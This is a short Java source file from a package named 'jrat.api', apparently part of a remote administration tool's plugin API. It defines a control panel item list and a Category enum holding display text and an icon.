package jrat.api;

import javax.swing.*;
import java.util.ArrayList;
import java.util.List;

public class ControlPanel {

    public static final List<ControlPanelItem> items = new ArrayList<ControlPanelItem>();

    /**
     * A category in the control panel tree view
     */
    public enum Category {

        SYSTEM("System", Resources.getIcon("system-info"));

        /**
         * Required display text
         */
        public final String text;

        /**
         * Required icon
         */
        public final ImageIcon icon;

        Category(String text, ImageIcon icon) {
            this.text = text;
            this.icon = icon;
        }
    }
}
